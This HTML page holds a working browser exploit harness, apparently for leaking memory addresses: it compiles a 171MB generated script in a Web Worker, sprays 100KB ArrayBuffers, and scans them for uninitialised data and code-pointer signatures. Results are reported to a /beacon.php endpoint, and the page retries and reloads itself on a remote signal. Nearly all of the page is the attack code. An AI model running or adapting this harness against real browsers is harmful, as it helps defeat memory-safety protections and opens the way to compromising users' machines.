<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1169 Rescan-All Harvest + HUD</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
#hud h1{color:#00ff88;font-size:20px;margin-bottom:6px}
#status{font-size:22px;font-weight:bold;color:#ffd75e;padding:6px 0}
#phase{font-size:18px;color:#00ffee}
#counters{font-size:16px;color:#b9c6ee;line-height:1.8}
#finds{font-size:16px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
.win{color:#00ff66;font-weight:bold}
#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
</style>
</head><body>
<div id="hud">
  <h1>P1169 — SWEEP CODE-POINTER HARVEST</h1>
  <div id="status">BOOTING...</div>
  <div id="phase">phase: init</div>
  <div id="counters">buffers: 0 | scanned: 0 | finds: 0</div>
  <div id="finds">no findings yet</div>
</div>
<div id="log"></div>
<script>
'use strict';
var L=document.getElementById('log');
var S=document.getElementById('status');
var PH=document.getElementById('phase');
var CT=document.getElementById('counters');
var FD=document.getElementById('finds');
function setStatus(t){S.textContent=t;}
function setPhase(t){PH.textContent='phase: '+t;}
function setCounters(a,b,c){CT.textContent='pre: '+a+' | live: '+b+' | scanned: '+c+' | finds: '+finds.length;}
function addFind(t){var d=document.createElement('div');d.className='win';d.textContent=t;FD.textContent='';FD.appendChild(d);}
function log(m,c){var d=document.createElement('div');d.className=c||'';
d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
var T0=Date.now();
function B(tag,data){try{var u='/beacon.php?tag=P1169-'+encodeURIComponent(tag);
if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
u+='&t='+Date.now();new Image().src=u;}catch(e){}}
window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};

var finds=[];
try{var pf=localStorage.getItem('p1169_finds');if(pf){finds=JSON.parse(pf);
  B('PREV-FINDS','n='+finds.length+'|'+JSON.stringify(finds).slice(0,800));}}catch(e){}
if(!Array.isArray(finds))finds=[];

var attempt=0;
try{attempt=parseInt(localStorage.getItem('p1169_att')||'0');}catch(e){}
try{localStorage.setItem('p1169_att',''+(attempt+1));}catch(e){}
B('BOOT','attempt='+attempt);
setStatus('ATTEMPT '+attempt+'/4');

if(attempt>=4){
  setStatus('IDLE — ALL ATTEMPTS DONE');
  setPhase('idle');
  B('IDLE','4 attempts done');
  log('=== IDLE ===','ok');
  try{localStorage.removeItem('p1169_att');}catch(e){}
}else{

var N_TARGET=38348816;
var CHUNK=4000000;
var CHUNKS=Math.floor(N_TARGET/CHUNK);
var REM=N_TARGET-CHUNKS*CHUNK;
var preAbs=[],liveAbs=[],goSent=false,lastB=0;
var scanPos=0,deepDone=false;

function buildBlob(){
  setPhase('BUILDING 171MB SCRIPT ('+N_TARGET+' calls)');
  var t0=Date.now();
  var parts=[];
  parts.push('self.__v141fn=function(a){');
  for(var c=0;c<CHUNKS;c++){
    parts.push('a();'.repeat(CHUNK));
    if(c%4===0){B('BLD','c='+c+'|ms='+(Date.now()-t0));setStatus('BUILD chunk '+c+'/'+CHUNKS);}
  }
  if(REM>0)parts.push('a();'.repeat(REM));
  parts.push('};self.postMessage({t:"compiled"});');
  var blob=new Blob(parts,{type:'application/javascript'});
  parts=null;
  B('BLOB','ms='+(Date.now()-t0));
  return blob;
}

function storeFind(f){
  finds.push(f);
  try{localStorage.setItem('p1169_finds',JSON.stringify(finds.slice(-10)));}catch(e){}
  B('FIND',JSON.stringify(f).slice(0,500));
  addFind('FIND #'+finds.length+': '+JSON.stringify(f).slice(0,400));
  setStatus('*** FIND CAPTURED ***');
  log('*** FIND: '+JSON.stringify(f).slice(0,300)+' ***','hit');
}

function deepScan(ab,i){
  var dv=new DataView(ab);
  var len=ab.byteLength;
  var nzQ=0,firstNZ='';
  for(var q=0;q+7<len;q+=8){
    var lo=dv.getUint32(q,true),hi=dv.getUint32(q+4,true);
    if(lo||hi){nzQ++;if(!firstNZ)firstNZ='q'+q+'='+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0');}
  }
  var sigs=[];
  for(var p=0;p+28<len;p+=4){
    if(dv.getUint32(p,true)===0xFFFFFFFF){
      var cpLo=dv.getUint32(p+12,true),cpHi=dv.getUint32(p+16,true);
      var idx=dv.getUint32(p+56,true);
      sigs.push('p='+p+'|cp=0x'+cpHi.toString(16).padStart(8,'0')+cpLo.toString(16).padStart(8,'0')+'|idx='+idx);
      if(sigs.length>=3)break;
    }
  }
  storeFind({i:i,nz:nzQ,first:firstNZ,sigs:sigs});
  deepDone=true;
}

function getAB(i){return i<preAbs.length?preAbs[i]:liveAbs[i-preAbs.length];}
function poll(){
  if(!goSent)return;
  var n=preAbs.length+liveAbs.length;
  if(n>0&&!deepDone){
    var end=Math.min(scanPos+12,n);
    for(var i=scanPos;i<end;i++){
      var ab=getAB(i);
      if(!ab)continue;
      var dv=new DataView(ab);
      for(var q=0;q<128;q++){
        var lo=dv.getUint32(q*8,true),hi=dv.getUint32(q*8+4,true);
        if(lo||hi){deepScan(ab,i);break;}
      }
      if(deepDone)break;
    }
    scanPos=end>=n?0:end;
  }
  if(!deepDone&&Date.now()-lastB>700){
    lastB=Date.now();
    B('POLL','pre='+preAbs.length+'|live='+liveAbs.length+'|cursor='+scanPos+'|finds='+finds.length);
  }
  setCounters(preAbs.length,liveAbs.length,scanPos);
  if(deepDone&&finds.length>=4)return;
  setTimeout(poll,10);
}

function liveAllocLoop(){
  var ticks=0;
  var iv=setInterval(function(){
    if(ticks>=600){clearInterval(iv);return;}
    ticks++;
    for(var k=0;k<20;k++)liveAbs.push(new ArrayBuffer(100*1024));
    setStatus('SWEEP RUNNING — live buffers: '+liveAbs.length);
  },50);
}

function runSweep(blob){
  setPhase('WORKER COMPILING (importScripts ~6s)');
  var blobUrl=URL.createObjectURL(blob);
  var wcode='importScripts('+JSON.stringify(blobUrl)+');'+
    'self.onmessage=function(m){if(m.data==="go"){'+
    'try{self.__v141fn(function(){ });}'+
    'catch(e){self.postMessage({t:"err",e:String(e)});}}};';
  var wUrl=URL.createObjectURL(new Blob([wcode],{type:'application/javascript'}));
  var worker=new Worker(wUrl);
  worker.__compiled=false;
  worker.onmessage=function(m){
    if(m.data&&m.data.t==='compiled'){
      worker.__compiled=true;
      setPhase('PRE-SPRAY 100MB');
      B('WORKER-COMPILED','ok');
      setTimeout(function(){
        var t0=Date.now();
        for(var i=0;i<1000;i++)preAbs.push(new ArrayBuffer(100*1024));
        B('PRE-SPRAY','n='+preAbs.length+'|ms='+(Date.now()-t0));
        setStatus('GO IN 0.3s');
        setTimeout(function(){
          goSent=true;
          setStatus('SWEEP RUNNING — watching for code pointer');
          setPhase('SWEEP');
          B('GO','sweep start');
          log('=== GO ===','warn');
          poll();
          liveAllocLoop();
          worker.postMessage('go');
          setTimeout(function(){
            B('SURVIVED','live='+liveAbs.length+'|finds='+finds.length);
            B('DONE','survived');
            setStatus(finds.length?'DONE — FINDS: '+finds.length:'DONE — NO FINDS THIS BOOT');
          },30000);
        },300);
      },300);
    }
    else if(m.data&&m.data.t==='err'){B('WORKER-ERR',String(m.data.e).slice(0,60));}
  };
  B('WORKER','created');
}

function useCache(){
  try{
    caches.open('p1169v1').then(function(cache){
      cache.match('p1169-src').then(function(resp){
        if(resp){
          B('CACHE-HIT','cached');
          resp.blob().then(runSweep);
        }else{
          B('CACHE-MISS','build');
          var blob=buildBlob();
          cache.put('p1169-src',new Response(blob,{headers:{'Content-Type':'application/javascript'}})).then(
            function(){B('CACHED','ok');runSweep(blob);},
            function(e){B('CACHE-ERR',String(e));runSweep(blob);});
        }
      });
    });
  }catch(e){B('CACHE-NA','build');runSweep(buildBlob());}
}

useCache();

setTimeout(function(){
  if(!goSent){B('TIMEOUT','no go');B('DONE','timeout');setStatus('TIMEOUT');}
},90000);

} /* attempts */

/* auto-reload checker */
(function(){
  var cur='P1169-rescan-hud';
  setTimeout(function check(){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/reload.txt?c='+Date.now(),true);
      x.onload=function(){
        var t=(x.responseText||'').trim();
        if(t&&t!==cur){location.reload(true);return;}
        setTimeout(check,3000);};
      x.onerror=function(){setTimeout(check,5000);};
      x.send();
    }catch(e){setTimeout(check,5000);}
  },4000);
})();
</script>
</body></html>
